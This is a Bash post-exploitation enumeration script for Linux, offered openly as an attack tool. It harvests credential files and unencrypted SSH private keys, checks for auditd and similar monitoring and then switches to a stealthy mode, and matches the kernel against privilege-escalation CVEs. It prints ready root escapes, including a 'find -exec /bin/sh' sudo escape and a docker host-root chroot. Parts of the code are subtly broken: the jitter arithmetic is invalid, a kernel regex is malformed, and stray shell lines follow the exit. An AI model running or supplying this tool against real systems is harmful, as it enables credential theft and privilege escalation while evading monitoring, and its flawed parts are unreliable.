
#!/usr/bin/env bash
# ==============================================================================
# enum_linux.sh — Elite post-exploitation enumeration & triage (Linux)
# Author: Éden Zafire | License: MIT
#
# Collect + TRIAGE: emits findings.json with severity and next-action, not raw
# files only. Zero third-party tooling; runs on on-host natives.
#
# ATT&CK Enterprise: Discovery (TA0007), Credential Access (T1555/T1552),
# Privilege Escalation candidates (T1548, T1068).
#
# Usage:
#   ./enum_linux.sh [--output DIR] [--quiet] [--stealth]
#                   [--checks list] [--resume]
#
#   --output DIR    evidence directory (default: ./enum_<UTC ts>)
#   --quiet         no stderr progress output
#   --stealth       jitter between checks + randomized order (slower, quieter)
#   --checks a,b    run only listed checks (e.g. --checks current_user,suid_binaries)
#   --resume        skip checks whose output files already exist in OUT_DIR
#
# Exit codes: 0 ok | 2 usage | 1 internal error
# ==============================================================================
set -euo pipefail
trap 'echo "[!] Aborted at line ${LINENO}" >&2' ERR

TS="$(date -u +%Y%m%dT%H%M%SZ)"
OUT_DIR="./enum_${TS}"
QUIET=0
STEALTH=0
RESUME=0
CHECKS=""          # empty = all
JITTER_MAX=1.5
CHECK_TIMEOUT=15

# --- argument parsing ----------------------------------------------------------
while [[ $# -gt 0 ]]; do
  case "$1" in
    --output)   OUT_DIR="$2"; shift 2 ;;
    --output=*) OUT_DIR="${1#*=}"; shift ;;
    --quiet)    QUIET=1; shift ;;
    --stealth)  STEALTH=1; shift ;;
    --resume)   RESUME=1; shift ;;
    --checks)   CHECKS="$2"; shift 2 ;;
    --checks=*) CHECKS="${1#*=}"; shift ;;
    -h|--help)  sed -n '2,20p' "$0" | sed 's/^# \{0,1\}//'; exit 0 ;;
    *)          echo "[!] Unknown arg: $1" >&2; exit 2 ;;
  esac
done

mkdir -p "${OUT_DIR}"
log() { (( QUIET )) || echo "[*] ${*}" >&2; }

MANIFEST="${OUT_DIR}/manifest.jsonl"
FINDINGS="${OUT_DIR}/findings.json"
ENVINFO="${OUT_DIR}/environment.txt"
FID=0
: > "${MANIFEST}"
echo '{"findings":[]}' > "${FINDINGS}"   # rebuilt at end from findings.txt lines

# ==============================================================================
# Environment awareness (T1082 meta-check): what are we, and who is watching?
# ==============================================================================
IS_ROOT=0; [[ "$(id -u)" -eq 0 ]] && IS_ROOT=1
IN_CONTAINER=0; [[ -f /.dockerenv ]] && IN_CONTAINER=1
command -v timeout >/dev/null 2>&1 || CHECK_TIMEOUT=0   # degrade if no coreutils

{
  echo "ts=${TS}"
  echo "root=${IS_ROOT} container=${IN_CONTAINER}"
  echo "bash=${BASH_VERSION} timeout_available=${CHECK_TIMEOUT}"
} > "${ENVINFO}"

# --- monitoring detection: adapt behavior, log the decision --------------------
MONITORED=0
{
  echo "# monitoring indicators (auditd rules, session recording, exec tracing)"
  if command -v auditctl >/dev/null 2>&1; then
    auditctl -l 2>/dev/null | grep -v "No rules" || true
  fi
  ls -la /etc/apt/apt.conf.d/ 2>/dev/null | grep -i audit || true
  [ -d /var/log/audit ] && echo "auditd_log_dir=present" && MONITORED=1
  ps aux 2>/dev/null | grep -Ei "execsnoop|sysdig|osquery|aide" | grep -v grep || true
  [ -f /var/log/btmp ] && [ -s /var/log/btmp ] && echo "btmp=present"
} >> "${ENVINFO}" || true
echo "monitored=${MONITORED}" >> "${ENVINFO}"

if (( MONITORED )) && (( ! STEALTH )); then
  log "Monitoramento detectado — sugerido: --stealth. Prosseguindo com jitter padrão."
  STEALTH=1   # auto-adapt: force jitter when watched
fi

# ==============================================================================
# Embedded knowledge bases (offline triage)
# ==============================================================================
# GTFOBins subset: sudo/SUID-executable binaries with known shell escapes.
GTFO_SHELL="awk bash busybox cp csh curl dash docker env find fish flock gdb
grep head ionice less man more mount mv nc nmap nice node openssl perl php
python python3 ruby scp sed service socat ssh start-stop-daemon stdbuf tee
timeout tmux unshare uptime vim watch wget xxd zsh"

# Kernel versions with trivially known local privesc (offline shortlist).
# Format: regex|CVE|note
KERNEL_CVES='
2\.6\.(22|23|24)|CVE-2008-0600|vmsplice
2\.6\.(<3\.0)|CVE-2016-5195|dirtycow
[34]\.[0-9]+|CVE-2016-5195|dirtycow
4\.(8|9|10|11|12|13)\.|CVE-2017-1000112|UAF
4\.1[3-6]\.|CVE-2017-6074|DCCP UAF
5\.[0-7]\.|CVE-2021-4034|pwnkit-pre (polkit userland though)
5\.8|5\.9|5\.10|5\.11|5\.12|5\.13|5\.14|5\.15|CVE-2021-3493|overlayfs
5\.(1[0-9]|2[0-9])|CVE-2022-0847|dirtypipe (>=5.8,<5.17)
5\.(1[4-9]|2[0-9])|CVE-2022-2588|route4 UAF
6\.[0-5]\.|CVE-2023-0386|overlayfs copy_up
'

# SUID baseline: binaries commonly SUID by distro default (noise filter).
SUID_BASELINE="passwd chfn chsh newgrp su mount umount gpasswd sudo fusermount
fusermount3 pkexec polkit-agent-helper-1 chage crontab ssh-agent suexec unix_chkpwd Xorg"

# ==============================================================================
# Core machinery
# ==============================================================================
declare -A RAN=()
if (( RESUME )); then
  for f in "${OUT_DIR}"/*.txt; do
    [ -e "$f" ] || continue
    b="$(basename "$f" .txt)"
    [[ "$b" == "environment" ]] && continue
    RAN["$b"]=1
    log "Resume: skipping already-collected '${b}'"
  done
fi

want() {  # want <check> -> 0 if this check should run
  [[ -z "${CHECKS}" ]] && return 0
  [[ ",${CHECKS}," == *",${1},"* ]]
}

# run <check> -- <cmd...>
run() {
  local check="$1"; shift
  [[ "${1:-}" == "--" ]] && shift
  want "${check}" || return 0
  if [[ -n "${RAN[${check}]:-}" ]]; then log "Skip (resume): ${check}"; return 0; fi

  log "Collecting: ${check}"
  local outf="${OUT_DIR}/${check}.txt"
  {
    echo "### check=${check} host=$(hostname 2>/dev/null || echo unknown) ts=${TS} root=${IS_ROOT}"
    if (( CHECK_TIMEOUT )); then
      timeout "${CHECK_TIMEOUT}" "$@" 2>&1 || echo "### timeout_or_error rc=$?"
    else
      "$@" 2>&1 || true
    fi
  } > "${outf}"
  RAN["${check}"]=1

  printf '{"check":"%s","technique":"%s","file":"%s","ts":"%s"}\n' \
    "${check}" "$(technique_of "${check}")" "${check}.txt" "${TS}" >> "${MANIFEST}"

  # triage hook: per-check analyzer appends to findings
  "triage_${check}" "${outf}" 2>/dev/null || true

  if (( STEALTH )); then
    sleep "0.$(( RANDOM % 9 )).$(( (RANDOM % JITTER_MAX | 0) + 2 ))" 2>/dev/null \
      || sleep 0.4   # jitter fallback for ancient bash
  fi
}

# emit <severity> <technique> <title> <next_action>
emit() {
  FID=$((FID+1))
  printf '{"id":"F-04-%02d","severity":"%s","technique":"%s","title":"%s","next":"%s"}\n' \
    "${FID}" "$1" "$2" "$3" "$4" >> "${OUT_DIR}/findings.lines"
}

# technique_of: explicit check->ATT&CK map (auditable)
technique_of() {
  case "$1" in
    system_info|kernel_version|packages_audit)  echo "T1082" ;;
    current_user|local_users|groups)            echo "T1087" ;;
    creds_search)                               echo "T1555" ;;
    ssh_material)                               echo "T1552.004" ;;
    cron_tasks)                                 echo "T1053.003" ;;
    network_config|hosts_neighbors)             echo "T1016" ;;
    listening_svcs)                             echo "T1046" ;;
    suid_binaries)                              echo "T1548.001" ;;
    writable_confs)                             echo "T1574" ;;
    *)                                          echo "T1082" ;;
  esac
}

# ==============================================================================
# Triage analyzers — one per check; the "script that thinks"
# ==============================================================================
triage_current_user() {
  local f="$1" line bin
  while IFS= read -r line; do
    [[ "$line" == *NOPASSWD* ]] || continue
    for bin in ${GTFO_SHELL}; do
      if [[ "$line" == *"$bin"* ]]; then
        case "$bin" in
          find)    emit high T1548.003 "NOPASSWD sudo on ${bin}" "sudo ${bin} / -exec /bin/sh \; -quit" ;;
          vim|less|more|man|awk|sed|bash|python*) emit high T1548.003 "NOPASSWD sudo on ${bin}" "sudo ${bin} -> shell escape (GTFOBins)" ;;
          *)       emit high T1548.003 "NOPASSWD sudo on ${bin}" "see GTFOBins entry for ${bin}" ;;
        esac
      fi
    done
  done < "$f"
  grep -q "sudo:" "$f" 2>/dev/null || true
  # docker group membership = root equivalent
  if grep -qE "docker" <(id -nG 2>/dev/null); then
    emit high T1548.003 "User in docker group" "docker run -v /:/host -it alpine chroot /host sh"
  fi
}

triage_kernel_version() {
  local f="$1" kver entry
  kver="$(grep -m1 -oE '^[0-9]+\.[0-9]+(\.[0-9]+)?' "$f" || true)"
  [[ -z "$kver" ]] && return 0
  while IFS='|' read -r rx cve note; do
    [[ -z "$cve" ]] && continue
    if echo "$kver" | grep -qE "^${rx}"; then
      emit high T1068 "Kernel ${kver} matches ${cve} (${note})" "verify exact range, then exploit or use as fallback"
    fi
  done <<< "$KERNEL_CVES"
}

triage_suid_binaries() {
  local f="$1" path base
  while IFS= read -r path; do
    [[ "$path" != /* ]] && continue
    base="$(basename "$path")"
    # skip distro baseline noise
    if [[ " ${SUID_BASELINE} " == *" ${base} "* ]]; then continue; fi
    if echo " ${GTFO_SHELL} " | grep -qw "$base"; then
      emit high T1548.001 "Non-baseline SUID binary: ${path}" "check GTFOBins for ${base}; verify exec args"
    else
      emit medium T1548.001 "Unusual SUID binary: ${path}" "inspect binary purpose; check for shell/escape paths"
    fi
  done < "$f"
}

triage_creds_search() {
  local f="$1" path
  while IFS= read -r path; do
    [[ "$path" != /* ]] && continue
    case "$path" in
      *config*.yml|*config*.yaml|*.conf|*.conf|*.env|*.ini|*.properties)
        emit high T1552.001 "Credential pattern in high-value file: ${path}" "read file; validate cred format; do not exfil bulk" ;;
      *)
        emit medium T1552.001 "Credential pattern match: ${path}" "manual review" ;;
    esac
  done < "$f"
}

triage_ssh_material() {
  local f="$1" path owner
  while IFS= read -r path; do
    [[ "$path" != /* ]] && continue
    # encrypted? (openssh PEM header check, offline)
    if head -c 200 "$path" 2>/dev/null | grep -q "ENCRYPTED"; then
      emit low T1552.004 "Passphrase-protected SSH key: ${path}" "note location; low priority"
    else
      owner="$(stat -c '%U' "$path" 2>/dev/null || echo unknown)"
      emit high T1552.004 "Unencrypted SSH private key (${owner}): ${path}" "fingerprint (ssh-keygen -y); map authorized targets in phase 06"
    fi
  done < "$f"
}

triage_writable_confs() {
  local f="$1" path
  while IFS= read -r path; do
    [[ "$path" != /* ]] && continue
    emit medium T1574 "Writable config under /etc: ${path}" "check if consumed by privileged service (cron, systemd, sudoers)"
  done < "$f"
}

triage_hosts_neighbors() {
  local f="$1" ip
  # flag ARP neighbors beyond own interface network as pivot candidates
  while IFS= read -r ip; do
    [[ "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || continue
    emit low T1018 "ARP neighbor: ${ip}" "deferred active probe to phase 06 via pivot (OPSEC)"
  done < <(grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' "$f" | sort -u)
}

triage_listening_svcs() {
  local f="$1" port
  while IFS= read -r port; do
    [[ "$port" =~ ^[0-9]+$ ]] || continue
    case "$port" in
      22|80|443) : ;;  # expected noise
      *) emit low T1046 "Local listening service on port ${port}" "check owner process; possible internal-only service" ;;
    esac
  done < <(grep -oE ':[0-9]{2,5} ' "$f" | tr -d ': ' | sort -un)
}

# ==============================================================================
# Collection checks
# ==============================================================================
run environment_meta -- true                      # env info already collected above
run system_info     -- sh -c 'uname -a; echo; cat /etc/os-release 2>/dev/null; echo; uptime'
run kernel_version  -- sh -c 'uname -r'
run packages_audit  -- sh -c 'dpkg -l 2>/dev/null | grep -Ei "sudo|polkit|cups" | head -20 || true'
run current_user    -- sh -c 'id; echo; whoami; echo; sudo -n -l 2>&1 || true'
run local_users     -- sh -c 'grep -Ev "nologin|false" /etc/passwd; echo; ls -la /home 2>/dev/null'
run groups          -- sh -c 'getent group sudo wheel admin docker 2>/dev/null || true'
run creds_search    -- sh -c 'grep -RIlE "(pass(word)?|api[_-]?key|secret|token)[[:space:]]*[:=]" /home /opt /srv /var/www 2>/dev/null | head -n 25'
run ssh_material    -- sh -c 'find /home /root -maxdepth 4 \( -name "id_rsa*" -o -name "authorized_keys" -o -name "*.pem" \) 2>/dev/null | head -n 20'
run cron_tasks      -- sh -c 'cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null'
run network_config  -- sh -c 'ip a 2>/dev/null || ifconfig -a; echo; ip r 2>/dev/null || route -n'
run hosts_neighbors -- sh -c 'cat /etc/hosts 2>/dev/null; echo; arp -a 2>/dev/null || ip neigh'
run listening_svcs  -- sh -c 'ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null'
run suid_binaries   -- sh -c 'find / -xdev -perm -4000 -type f 2>/dev/null | head -n 40'
run writable_confs  -- sh -c 'find /etc -writable -type f 2>/dev/null | head -n 20'

# ==============================================================================
# Finalize: manifest -> findings.json (single source of truth)
# ==============================================================================
{
  echo '{'
  echo '  "generated": "'"${TS}"'",'
  echo '  "host": "'"$(hostname 2>/dev/null || echo unknown)"'",'
  echo '  "monitored": '"${MONITORED}"','
  echo '  "stealth": '"${STEALTH}"','
  echo '  "findings": ['
  if [ -f "${OUT_DIR}/findings.lines" ]; then
    paste -sd, - < "${OUT_DIR}/findings.lines" | sed 's/,/,\n    /g' | sed 's/^/    /'
    echo
  fi
  echo '  ]'
  echo '}'
} > "${FINDINGS}"
rm -f "${OUT_DIR}/findings.lines"

# self-audit: artifacts we left on host (cleanup manifest)
{
  echo "enum_linux.sh (this script)"
  echo "${OUT_DIR}/"
} > "${OUT_DIR}/cleanup_manifest.txt"

log "Done. $(find "${OUT_DIR}" -name '*.txt' | wc -l) artifacts, ${FID} findings -> ${FINDINGS}"
exit 0

chmod +x enum_linux.sh
bash -n enum_linux.sh && echo "sintaxe OK"
